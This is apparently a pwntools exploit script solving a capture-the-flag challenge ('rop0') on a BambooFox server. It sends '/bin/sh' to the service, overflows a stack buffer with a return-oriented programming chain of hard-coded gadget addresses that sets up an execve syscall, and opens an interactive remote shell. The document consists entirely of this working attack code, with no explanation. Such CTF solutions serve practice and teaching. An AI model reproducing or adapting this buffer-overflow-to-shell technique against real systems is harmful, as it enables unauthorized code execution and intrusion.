from pwn import *

r = remote('bamboofox.cs.nctu.edu.tw', 12016)
#r = process('./rop0')

pop_rdi = p64(0x401516)
pop_rbx = p64(0x400d55)
push_rbx = p64(0x40d789)
push_rsp = p64(0x41be4a)
xor_eax = p64(0x401590)
syscall = p64(0x4003da)
pop_rdx = p64(0x4428e6)
pop_rsi = p64(0x401637)
pop_rax_rdx_rbx = p64(0x478616)

buf = 0x7fffffffe220
ret = 0x7fffffffe248

r.send('/bin/sh\0')
r.recvuntil('input_size')
r.send('a' * (ret-buf) + pop_rdi + p64(0x6ccd60) + pop_rsi + p64(0) + pop_rax_rdx_rbx + p64(59) + p64(0) + p64(0) + syscall)
r.interactive()
